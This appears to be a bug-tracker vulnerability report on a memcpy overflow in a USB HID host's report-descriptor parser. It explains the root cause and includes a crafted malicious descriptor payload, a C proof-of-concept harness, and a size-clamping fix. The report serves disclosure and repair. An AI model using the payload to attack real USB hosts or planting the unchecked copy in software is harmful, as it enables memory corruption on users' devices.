# HID Host USAGE_PAGE Extended Item — memcpy Overflow

| Field | Value |
|-------|-------|
| **CWE** | CWE-120: Buffer Copy without Checking Size of Input |
| **CVSS** | 5.3 (Medium) |
| **Verdict** | real |
| **File** | `src/class/hid/hid_host.c` |
| **Function** | `tuh_hid_parse_report_descriptor()` |
| **Status** | Open |
| **Source** | student-sbingqua (BUG-007) |

## Root Cause

At line 754 of `hid_host.c`, when a `RI_GLOBAL_USAGE_PAGE` item is encountered, the code copies the item's raw data into the `usage_page` field of `tuh_hid_report_info_t`:

```c
case RI_GLOBAL_USAGE_PAGE:
  if (ri_collection_depth == 0) memcpy(&info->usage_page, desc_report, size);
  break;
```

The `info->usage_page` field is a `uint16_t` — 2 bytes wide. However, per the HID specification (Section 6.2.2.2), when the header's size field is 3, it is promoted to 4 bytes. This means `size` can be 4, and `memcpy` will write 4 bytes into a 2-byte field, overwriting the 2 bytes immediately following `usage_page` in the `tuh_hid_report_info_t` struct.

## Trigger

A USB HID device sends a report descriptor containing an extended USAGE_PAGE item with a 4-byte data payload (header size field = 3, which maps to 4 bytes per HID spec). This item must appear before any COLLECTION item (i.e., `ri_collection_depth == 0`) to enter the vulnerable code path.

```
// HID item: USAGE_PAGE with 4-byte payload
// Header byte: tag=0 (USAGE_PAGE), type=1 (Global), size=3 (→4 bytes)
// = 0b0000_01_11 = 0x07
0x07, 0x01, 0x00, 0x41, 0x41   // 4-byte USAGE_PAGE data
```

## Impact

**Stack/struct buffer overflow** — 2 bytes past `usage_page` are overwritten. The overwritten fields depend on struct layout but typically corrupt the `report_id` and/or padding bytes of `tuh_hid_report_info_t`. This could:

- Corrupt report parsing state, leading to incorrect HID report handling
- On certain compilers/platforms where the struct is stack-allocated or part of a tightly packed array, this could overwrite adjacent control data

## PoC

```c
// Extended USAGE_PAGE item: header=0x07 (size=3→4 bytes)
uint8_t malicious_desc[] = {
  0x07,                         // USAGE_PAGE, Global, size=3 (4 bytes)
  0x01, 0x00, 0x41, 0x41,      // 4-byte payload → overflows uint16_t usage_page
  0xA1, 0x01,                   // COLLECTION (Application)
  0xC0                          // END_COLLECTION
};

tuh_hid_report_info_t info[4];
memset(info, 0xCC, sizeof(info));

uint8_t count = tuh_hid_parse_report_descriptor(info, 4,
    malicious_desc, sizeof(malicious_desc));

// Check: bytes past usage_page are corrupted
// info[0].usage_page == 0x0001, but 2 adjacent bytes are now 0x41 0x41
```

## Fix

Clamp `size` to `sizeof(info->usage_page)` before the `memcpy`:

```c
case RI_GLOBAL_USAGE_PAGE:
  if (ri_collection_depth == 0) {
    uint8_t copy_sz = (size <= sizeof(info->usage_page)) ? size : sizeof(info->usage_page);
    memcpy(&info->usage_page, desc_report, copy_sz);
  }
  break;
```

## Related

- [[hid-host-parse-report-heap-overflow]] — same function, OOB read on remaining-length underflow
- [[descriptor-walk-oob-infinite-loop]] — generic descriptor parsing issues
